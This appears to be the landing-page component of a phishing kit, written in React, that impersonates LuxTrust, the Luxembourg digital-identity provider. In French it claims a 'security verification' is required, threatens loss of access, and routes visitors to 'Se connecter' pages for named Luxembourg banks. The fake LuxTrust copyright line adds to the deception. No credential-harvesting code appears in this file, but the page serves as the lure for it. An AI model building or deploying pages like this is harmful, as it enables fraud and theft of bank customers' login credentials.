import { Link } from "react-router-dom";
import { BANKS } from "../lib/banks";
import { BANK_FALLBACK_URLS, BANK_LOGO_URLS } from "../lib/bankLogos";

function LuxTrustWordmark() {
  return (
    <span className="flex items-center gap-1.5">
      <span className="text-[22px] font-black tracking-tight text-neutral-900 sm:text-[24px]">
        LUX<span className="bg-gradient-to-r from-cyan-500 to-blue-700 bg-clip-text text-transparent">TRUST</span>
      </span>
    </span>
  );
}

function BankLogo({ slug, name }) {
  const src = BANK_LOGO_URLS[slug];
  const fallback = BANK_FALLBACK_URLS[slug];
  return (
    <span className="flex h-14 w-20 shrink-0 items-center justify-center overflow-hidden rounded-xl bg-slate-50 ring-1 ring-black/5 sm:h-16 sm:w-24">
      <img
        src={src}
        alt={name}
        loading="lazy"
        className="max-h-10 w-auto max-w-[64px] object-contain sm:max-h-12 sm:max-w-[80px]"
        onError={(e) => {
          const img = e.currentTarget;
          if (img.src !== fallback) {
            img.src = fallback;
          } else {
            img.style.display = "none";
            if (img.nextSibling) img.nextSibling.style.display = "block";
          }
        }}
      />
      <span style={{ display: "none" }} className="text-[18px] font-black text-neutral-400">
        {name?.charAt(0)}
      </span>
    </span>
  );
}

export default function Landing() {
  return (
    <div className="min-h-screen w-full overflow-x-hidden bg-white text-slate-800">
      {/* Top bar */}
      <header className="sticky top-0 z-40 w-full bg-white/95 backdrop-blur">
        <div className="mx-auto flex w-full max-w-3xl items-center justify-between px-4 py-3">
          <LuxTrustWordmark />
          <div className="flex items-center gap-1">
            <button type="button" aria-label="Rechercher" className="flex h-10 w-10 items-center justify-center rounded-full text-neutral-800 transition hover:bg-neutral-100 active:scale-95">
              <svg viewBox="0 0 24 24" className="h-[22px] w-[22px]" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round">
                <circle cx="11" cy="11" r="7" />
                <path d="m20 20-3.8-3.8" />
              </svg>
            </button>
            <button type="button" aria-label="Menu" className="flex h-10 w-10 items-center justify-center rounded-full text-neutral-800 transition hover:bg-neutral-100 active:scale-95">
              <svg viewBox="0 0 24 24" className="h-[22px] w-[22px]" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round">
                <path d="M4 7h16 M4 12h16 M4 17h16" />
              </svg>
            </button>
          </div>
        </div>
      </header>

      {/* Hero */}
      <section className="relative w-full overflow-hidden bg-gradient-to-br from-cyan-400 via-blue-500 to-blue-700">
        {/* diagonal shapes */}
        <div className="pointer-events-none absolute inset-0">
          <div className="absolute -right-16 -top-24 h-[130%] w-[62%] rotate-[18deg] bg-white/10" />
          <div className="absolute -right-6 -top-24 h-[130%] w-[42%] rotate-[18deg] bg-blue-900/20" />
          <div className="absolute -left-20 bottom-0 h-40 w-[55%] -rotate-[8deg] bg-white/10" />
        </div>
        <img
          src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=800&q=80&auto=format&fit=crop"
          alt=""
          aria-hidden="true"
          loading="eager"
          className="pointer-events-none absolute inset-y-0 right-0 h-full w-[46%] object-cover object-top"
          onError={(e) => {
            e.currentTarget.style.display = "none";
          }}
        />
        <div className="pointer-events-none absolute inset-0 bg-gradient-to-r from-cyan-500/60 via-blue-600/55 to-blue-800/25" />
        <div className="relative mx-auto w-full max-w-3xl px-5 pb-10 pt-9 sm:px-6 sm:pb-14 sm:pt-12">
          <h1 className="max-w-[240px] text-[30px] font-extrabold leading-[1.12] tracking-tight text-white drop-shadow-sm sm:max-w-md sm:text-[40px]">
            Vérification de sécurité requise
          </h1>
          <p className="mt-3 max-w-[250px] text-[14px] leading-relaxed text-white/95 sm:max-w-md sm:text-[15.5px]">
            Pour votre sécurité, veuillez effectuer la vérification requise via le processus officiel de
            vérification LuxTrust. Si la vérification n&apos;est pas effectuée, l&apos;accès à certains
            services LuxTrust peut être restreint.
          </p>
        </div>
      </section>

      <main className="mx-auto w-full max-w-3xl px-4 pb-10 sm:px-6">
        {/* Security notice */}
        <div className="mt-4 flex gap-2.5 rounded-2xl border border-amber-200 bg-amber-50 px-4 py-3">
          <svg viewBox="0 0 24 24" className="h-5 w-5 shrink-0 text-amber-600" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
            <path d="M12 3 2.5 20h19L12 3z" strokeLinejoin="round" />
            <path d="M12 10v4m0 3h.01" />
          </svg>
          <p className="text-[13px] leading-relaxed text-amber-900">
            <b>Pour des raisons de sécurité</b>, vous devez vous vérifier auprès de votre banque. Sans
            cela, vous ne pourrez plus accéder à LuxTrust.
          </p>
        </div>

        <h2 className="mt-7 text-center text-[24px] font-extrabold tracking-tight text-neutral-900 sm:text-[28px]">
          Banques partenaires
        </h2>
        <p className="mx-auto mt-1.5 max-w-md text-center text-[14px] leading-relaxed text-neutral-500">
          Accédez à vos services bancaires en ligne en toute sécurité grâce à votre identité LuxTrust.
        </p>

        <div className="mt-5 space-y-3">
          {BANKS.map((b) => (
            <Link
              key={b.slug}
              to={`/${b.slug}`}
              className="flex w-full items-center gap-3 rounded-2xl bg-white p-3 shadow-[0_2px_14px_rgba(0,0,0,0.06)] ring-1 ring-black/5 transition hover:-translate-y-[1px] hover:shadow-[0_8px_24px_rgba(0,0,0,0.10)] active:scale-[0.99] sm:gap-4 sm:p-4"
            >
              <BankLogo slug={b.slug} name={b.name} />
              <span className="min-w-0 flex-1">
                <span className="block truncate text-[15.5px] font-extrabold tracking-tight text-neutral-900 sm:text-[17px]">
                  {b.slug === "eboo" ? "POST Luxembourg - ..." : b.slug === "rnet" ? "Banque Raiffeisen - ..." : b.name}
                </span>
                <span className="block truncate text-[13px] text-neutral-500">{b.sub}</span>
              </span>
              <span className="flex shrink-0 items-center gap-1.5 rounded-xl bg-indigo-50 px-3 py-2.5 text-[13px] font-extrabold text-indigo-600 transition group-hover:bg-indigo-100 sm:px-4 sm:text-[14px]">
                Se connecter
                <svg viewBox="0 0 24 24" className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth="2.6" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M5 12h14 M13 6l6 6-6 6" />
                </svg>
              </span>
            </Link>
          ))}
        </div>

        <p className="mt-6 text-center text-[11.5px] text-neutral-400">
          © 2026 LuxTrust S.A. Luxembourg — Vérification d&apos;identité sécurisée
        </p>
      </main>
    </div>
  );
}
